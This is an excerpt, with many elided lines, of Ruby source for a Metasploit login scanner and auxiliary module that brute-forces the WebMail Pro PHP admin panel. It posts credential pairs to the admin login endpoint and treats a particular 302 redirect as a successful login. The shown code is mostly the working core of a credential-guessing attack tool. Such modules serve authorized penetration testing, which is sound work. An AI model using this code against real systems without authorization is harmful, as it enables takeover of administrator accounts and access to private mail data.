...
module Metasploit
  module Framework
    module LoginScanner
      class WebMailProAdminPanel < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          ...
          begin
            ...
            req = cli.request_cgi({
              'method' => 'POST',
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'adminpanel/index.php?login',
              'vars_post' => {
                'AdmloginInput' => credential.public,
                'AdmpasswordInput' => credential.private,
                'enter' => 'Login'
              }
            })
            ...
            if res && res.code == 302 && res.headers['Location'] =~ /index.php\?enter/
...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize
    super(
        'Name'           => 'WebMail Pro PHP Admin Panel Bruteforce',
        'Description'    => %q(
        This module attempts to bruteforce weak admin credentials for the WebMail Pro PHP admin panel.
...
organization or other sensitive information.
        ...
        Video: https://asciinema.org/a/ZMgrAOwMqLVjYCj1T2PcTlXWD
  ...
  def run_host(ip)
    ...
    scanner = Metasploit::Framework::LoginScanner::WebMailProAdminPanel.new(
